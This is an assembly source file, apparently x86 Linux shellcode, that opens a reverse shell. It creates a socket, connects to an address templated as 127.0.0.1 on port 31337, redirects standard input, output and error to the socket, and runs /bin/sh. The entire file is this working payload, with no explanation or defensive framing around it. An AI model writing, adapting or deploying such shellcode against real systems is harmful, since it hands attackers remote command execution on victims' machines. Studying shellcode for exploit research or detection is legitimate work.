BITS 32
global _start
_start:
    xor eax,eax
    mov al,0x66
    cdq
    push 0x1
    pop ebx
    push edx
    push ebx
    push 0x2
    mov ecx,esp
    int 0x80
    pop ebx
    pop ebp
    mov esi,0x100007f ; hex(u32(binary_ip('')))
    push esi
    mov bp,0x7a69 ; 31337
    bswap ebp
    or ebp,ebx
    push ebp
    inc ebx
    push 0x10
    push ecx
    push eax
    mov al,0x66
    mov ecx,esp
    int 0x80

    xchg ebx,ecx
    pop ebx
dup2:
    mov al,0x3f
    int 0x80
    dec ecx
    jns dup2

    xor eax,eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx,esp
    xor ecx,ecx
    xor edx,edx
    mov al,0xb
    int 0x80
